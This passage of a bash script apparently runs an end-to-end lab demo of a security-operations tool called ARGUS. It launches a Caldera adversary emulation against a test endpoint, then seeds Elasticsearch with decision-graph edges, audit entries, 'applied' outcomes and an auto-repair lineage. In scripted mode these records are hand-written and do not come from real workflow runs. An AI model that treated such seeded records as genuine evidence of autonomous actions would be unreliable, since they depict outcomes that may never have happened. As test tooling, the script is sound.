  # previous live edges (keeping the baseline `argus.demo-seed` neighborhood)
  # before writing fresh ones. Evidence timestamps are recent so the chain
  # surfaces in the panel's "recent roots" picker.
  local op_id="$1"
  local alert_id="${2:-pending}"
  log "publishing decision-graph chain for operation ${op_id} (alert=${alert_id})..."

  local advisory_id intent_id outcome_id audit_id reasoning_id
  local observation_id rule_id actor_id short_op
  advisory_id="CVE-ARGUS-E2E-LINUX"
  intent_id="mut-intent-cve-argus-e2e-linux"
  outcome_id="outcome-cve-argus-e2e-linux-applied"
  audit_id="audit-apply-${RULE_ID}"
  reasoning_id="run-synth-cve-argus-e2e-linux"
  observation_id="obs-argus-e2e-live-alert-${op_id}"
  rule_id="${RULE_ID}"
  actor_id="caldera-op-${op_id}"
  short_op="${op_id:0:8}"

  local ts
  ts="$(date -u +%Y-%m-%dT%H:%M:%S.000Z)"

  # Delete prior `argus.e2e-live` edges so re-runs don't bloat the graph.
  curl_es -X POST "${ES_URL}/.soc-decision-graph/_delete_by_query?refresh=true" \
    -d '{"query":{"term":{"source":"argus.e2e-live"}}}' >/dev/null 2>&1 || true

  local bulk_file
  bulk_file="$(mktemp -t argus_dg_edges.XXXXXX.ndjson)"
  emit_edge() {
    local edge_id="$1" relation="$2"
    local from_kind="$3" from_id="$4" from_label="$5"
    local to_kind="$6" to_id="$7" to_label="$8"
    local strength="$9" prov_idx="${10}" prov_doc="${11}"
    printf '{"create":{}}\n' >>"${bulk_file}"
    printf '{"@timestamp":"%s","edge_id":"%s","relation":"%s","from_kind":"%s","from_id":"%s","from_label":"%s","to_kind":"%s","to_id":"%s","to_label":"%s","evidence_ts":"%s","strength":%s,"provenance":{"source_index":"%s","source_doc_id":"%s"},"source":"argus.e2e-live"}\n' \
      "${ts}" "${edge_id}" "${relation}" "${from_kind}" "${from_id}" "${from_label}" \
      "${to_kind}" "${to_id}" "${to_label}" "${ts}" "${strength}" \
      "${prov_idx}" "${prov_doc}" >>"${bulk_file}"
  }

  # Caldera operation (actor) → technique and advisory
  emit_edge "edge-e2e-${op_id}-actor-tech-1059-004" "actor_uses_technique" \
    "actor" "${actor_id}" "caldera op ${short_op}" \
    "technique" "T1059.004" "T1059.004" \
    "0.9" ".soc-attack-commands" "${op_id}"
  emit_edge "edge-e2e-${op_id}-actor-advisory" "actor_triggers_advisory" \
    "actor" "${actor_id}" "caldera op ${short_op}" \
    "advisory" "${advisory_id}" "${advisory_id}" \
    "0.88" ".soc-attack-commands" "${op_id}"

  # Advisory → intent → (rule | outcome); reasoning → intent
  emit_edge "edge-e2e-advisory-intent" "advisory_to_intent" \
    "advisory" "${advisory_id}" "${advisory_id}" \
    "intent" "${intent_id}" "pipe-to-shell synthesis" \
    "0.93" ".soc-mutation-intents" "${intent_id}"
  emit_edge "edge-e2e-intent-rule" "intent_produces_rule" \
    "intent" "${intent_id}" "pipe-to-shell synthesis" \
    "rule" "${rule_id}" "${rule_id}" \
    "0.9" ".soc-recommendations" "${rule_id}"
  emit_edge "edge-e2e-intent-outcome" "intent_to_outcome" \
    "intent" "${intent_id}" "pipe-to-shell synthesis" \
    "outcome" "${outcome_id}" "applied" \
    "0.95" ".soc-outcomes" "${outcome_id}"
  emit_edge "edge-e2e-reasoning-intent" "reasoning_supports_intent" \
    "reasoning" "${reasoning_id}" "synth-cve-argus-e2e-linux" \
    "intent" "${intent_id}" "pipe-to-shell synthesis" \
    "0.9" ".soc-reasoning-trace" "${reasoning_id}"

  # Audit → outcome (governance trail for the apply)
  emit_edge "edge-e2e-audit-outcome" "audit_records_outcome" \
    "audit" "${audit_id}" "canary → promote" \
    "outcome" "${outcome_id}" "applied" \
    "1.0" ".soc-audit-trail" "${audit_id}"

  # Observation (live alert) → rule and outcome
  emit_edge "edge-e2e-observation-rule" "observation_of_rule" \
    "observation" "${observation_id}" "live alert ${ENDPOINT_HOSTNAME}" \
    "rule" "${rule_id}" "${rule_id}" \
    "0.85" ".alerts-security.alerts-default" "${alert_id}"
  emit_edge "edge-e2e-observation-outcome" "observation_supports_outcome" \
    "observation" "${observation_id}" "live alert ${ENDPOINT_HOSTNAME}" \
    "outcome" "${outcome_id}" "applied" \
    "0.8" ".alerts-security.alerts-default" "${alert_id}"

  # Rule → techniques (coverage)
  emit_edge "edge-e2e-rule-covers-T1059.004" "rule_covers_technique" \
    "rule" "${rule_id}" "${rule_id}" \
    "technique" "T1059.004" "T1059.004" \
    "0.9" ".soc-detection-corpus" "${rule_id}"
  emit_edge "edge-e2e-rule-covers-T1190" "rule_covers_technique" \
    "rule" "${rule_id}" "${rule_id}" \
    "technique" "T1190" "T1190" \
    "0.6" ".soc-detection-corpus" "${rule_id}"

  # Auto-repair lineage — ties the KQL-parse-failure repair back to the rule
  # so clicking into the rule in the Decision Graph surfaces the self-heal
  # event alongside the original synthesis chain.
  local repair_intent_id repair_outcome_id repair_reasoning_id
  repair_intent_id="mut-repair-kql-${rule_id}"
  repair_outcome_id="outcome-repair-kql-${rule_id}"
  repair_reasoning_id="run-repair-kql-${rule_id}"
  emit_edge "edge-e2e-rule-auto-repaired" "rule_auto_repaired" \
    "rule" "${rule_id}" "${rule_id}" \
    "reasoning" "${repair_reasoning_id}" "kql parse failure → eql fallback" \
    "1.0" ".soc-mutation-intents" "${repair_intent_id}"
  emit_edge "edge-e2e-repair-reasoning-intent" "reasoning_supports_intent" \
    "reasoning" "${repair_reasoning_id}" "kql parse failure → eql fallback" \
    "intent" "${repair_intent_id}" "auto-repair" \
    "0.95" ".soc-mutation-intents" "${repair_intent_id}"
  emit_edge "edge-e2e-repair-intent-outcome" "intent_to_outcome" \
    "intent" "${repair_intent_id}" "auto-repair" \
    "outcome" "${repair_outcome_id}" "rule re-applied" \
    "0.95" ".soc-outcomes" "${repair_outcome_id}"

  local resp
  resp="$(curl -sS -u "${KIBANA_USER}:${KIBANA_PASS}" \
    -H 'Content-Type: application/x-ndjson' \
    -X POST "${ES_URL}/.soc-decision-graph/_bulk?refresh=wait_for" \
    --data-binary "@${bulk_file}" -w '\n[http=%{http_code}]')"
  rm -f "${bulk_file}"
  if ! printf '%s' "${resp}" | grep -q '\[http=200\]'; then
    log "WARNING: decision-graph bulk non-200: $(printf '%s' "${resp}" | head -c 600)"
    return 0
  fi
  if printf '%s' "${resp}" | grep -q '"errors":true'; then
    log "WARNING: decision-graph bulk returned per-item errors: $(printf '%s' "${resp}" | head -c 600)"
    return 0
  fi
  # Count how many edges actually landed under source=argus.e2e-live — this
  # makes the summary truthful even if the bulk silently no-op'd.
  local chain_count
  chain_count="$(curl -sS -u "${KIBANA_USER}:${KIBANA_PASS}" \
    -H 'Content-Type: application/json' \
    "${ES_URL}/.soc-decision-graph/_count" \
    -d '{"query":{"term":{"source":"argus.e2e-live"}}}' |
    python3 -c 'import json,sys
try:
  print(json.load(sys.stdin).get("count", 0))
except Exception:
  print(0)' 2>/dev/null || printf 0)"
  log "decision-graph chain published (${chain_count} live edges)."
}

lookup_alert_id() {
  local query
  query="$(cat <<JSON
{
  "size": 1,
  "sort": [{ "@timestamp": "desc" }],
  "_source": false,
  "query": {
    "bool": {
      "filter": [
        { "term": { "kibana.alert.rule.rule_id": "${RULE_ID}" } },
        { "term": { "host.name": "${ENDPOINT_HOSTNAME}" } }
      ]
    }
  }
}
JSON
)"
  curl_es -X POST "${ES_URL}/.alerts-security.alerts-default/_search" -d "${query}" |
    python3 -c 'import json,sys
try:
  d=json.load(sys.stdin)
  hits=d.get("hits",{}).get("hits",[])
  print(hits[0].get("_id","") if hits else "")
except Exception:
  print("")' 2>/dev/null || printf ''
}

summary() {
  log "==== SUMMARY ===="
  log "Kibana:       ${KIBANA_URL}"
  log "ES:           ${ES_URL}"
  log "Fleet policy: ${POLICY_ID}"
  log "Rule:         ${RULE_ID}"
  log "Endpoint:     ${ENDPOINT_HOSTNAME}"
  log "ARGUS app:    ${KIBANA_URL}/app/security/argus"
  log "E2D deep-link: ${KIBANA_URL}/app/security/argus?tab=e2d&cve=CVE-ARGUS-E2E-LINUX"
  log "Decision chain root: CVE-ARGUS-E2E-LINUX (pick in ARGUS → Decision Graph)"
  log "Auto-repair lineage: ARGUS console → Activity feed → 'ARGUS auto-repaired the rule language after a KQL parse failure' (rule=${RULE_ID})"
  log "Alerts app:   ${KIBANA_URL}/app/security/alerts"
}

poll_for_workflow_artifacts() {
  local max_wait="${1:-180}" sleep_s=10
  local elapsed=0

  log "polling for workflow-produced artifacts (max ${max_wait}s)..."
  log "  W1 (alert-to-hypothesis) should create a .soc-cve-advisories entry"
  log "  W2 (auto-synthesis) should synthesize a rule and file mutation intent"
  log "  W3 (real-eval) should produce .soc-argus-eval-runs"

  while [ "$elapsed" -lt "$max_wait" ]; do
    local adv_count
    adv_count="$(curl_es "${ES_URL}/.soc-cve-advisories/_count" -d '{
      "query": {"bool": {"filter": [
        {"term": {"source": "argus.alert-to-hypothesis"}},
        {"range": {"@timestamp": {"gte": "now-15m"}}}
      ]}}
    }' 2>/dev/null | grep -o '"count":[0-9]*' | grep -o '[0-9]*' || echo 0)"

    if [ "${adv_count:-0}" -gt 0 ]; then
      log "workflow artifacts detected: ${adv_count} alert-driven advisories found"

      local rec_count
      rec_count="$(curl_es "${ES_URL}/.soc-recommendations/_count" -d '{
        "query": {"bool": {"filter": [
          {"range": {"@timestamp": {"gte": "now-15m"}}}
        ]}}
      }' 2>/dev/null | grep -o '"count":[0-9]*' | grep -o '[0-9]*' || echo 0)"
      log "  recommendations: ${rec_count}"

      local eval_count
      eval_count="$(curl_es "${ES_URL}/.soc-argus-eval-runs/_count" -d '{
        "query": {"bool": {"filter": [
          {"term": {"run_kind": "detection"}},
          {"term": {"source": "argus.workflow.e2d-reconciler"}},
          {"range": {"@timestamp": {"gte": "now-15m"}}}
        ]}}
      }' 2>/dev/null | grep -o '"count":[0-9]*' | grep -o '[0-9]*' || echo 0)"
      log "  eval runs: ${eval_count}"

      local trace_count
      trace_count="$(curl_es "${ES_URL}/.soc-reasoning-trace/_count" -d '{
        "query": {"bool": {"filter": [
          {"range": {"@timestamp": {"gte": "now-15m"}}}
        ]}}
      }' 2>/dev/null | grep -o '"count":[0-9]*' | grep -o '[0-9]*' || echo 0)"
      log "  reasoning traces: ${trace_count}"

      return 0
    fi

    sleep "${sleep_s}"
    elapsed=$((elapsed + sleep_s))
    log "  ...waiting for workflows (${elapsed}s / ${max_wait}s)"
  done

  log "WARNING: workflow artifacts not found after ${max_wait}s — workflows may not be running"
  return 1
}

main() {
  local mode="${1:-auto}"
  preflight
  compose_up
  wait_for "fleet-server healthy" "docker inspect -f '{{.State.Health.Status}}' soc-fleet-server | grep -q healthy" 80 5
  wait_for "caldera healthy"      "docker inspect -f '{{.State.Health.Status}}' soc-caldera | grep -q healthy" 60 5
  wait_for "soc-endpoint-1 up"    "docker inspect -f '{{.State.Status}}' soc-endpoint-1 | grep -q running" 60 3

  ensure_integrations
  install_rule
  wait_endpoint_enrolled
  ensure_caldera_adversary
  wait_sandcat_checkin

  local op_id
  op_id="$(launch_operation)"
  write_attack_command "${op_id}"
  inject_defend_telemetry "${op_id}"

  wait_alert
  local alert_id
  alert_id="$(lookup_alert_id)"

  if [ "${mode}" = "workflow" ]; then
    log "=== WORKFLOW MODE: waiting for autonomous workflows ==="
    if poll_for_workflow_artifacts 180; then
      log "workflows produced artifacts — skipping scripted E2D chain"
    else
      log "falling back to scripted E2D chain"
      emit_e2d_chain "${op_id}"
      emit_repair_event
      emit_decision_graph_chain "${op_id}" "${alert_id:-pending}"
    fi
  elif [ "${mode}" = "scripted" ]; then
    log "=== SCRIPTED MODE: direct artifact writes ==="
    emit_e2d_chain "${op_id}"
    emit_repair_event
    emit_decision_graph_chain "${op_id}" "${alert_id:-pending}"
  else
    log "=== AUTO MODE: scripted + poll for workflow enrichment ==="
    emit_e2d_chain "${op_id}"
    emit_repair_event
    emit_decision_graph_chain "${op_id}" "${alert_id:-pending}"
    poll_for_workflow_artifacts 60 || true
  fi

  summary
  log "E2E loop succeeded."
}

main "$@"
